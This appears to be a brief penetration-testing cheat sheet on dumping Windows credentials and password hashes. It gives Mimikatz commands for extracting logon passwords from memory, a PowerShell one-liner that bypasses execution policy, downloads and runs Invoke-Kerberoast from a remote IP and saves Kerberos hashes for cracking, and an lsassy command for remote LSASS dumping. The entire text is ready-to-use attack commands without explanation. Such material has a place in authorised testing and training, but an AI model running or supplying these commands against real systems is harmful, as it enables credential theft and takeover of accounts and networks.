# Credentials/Hashes DUMPING 


## Mimikatz.exe
```
mimikatz # privilege::debug

mimikatz # sekurlsa::logonpasswords
```

## Kerberoast
```
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.151:80/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
```
## lsassy
```
lsassy -m 0 -d domain.com -u username -p password ip

```
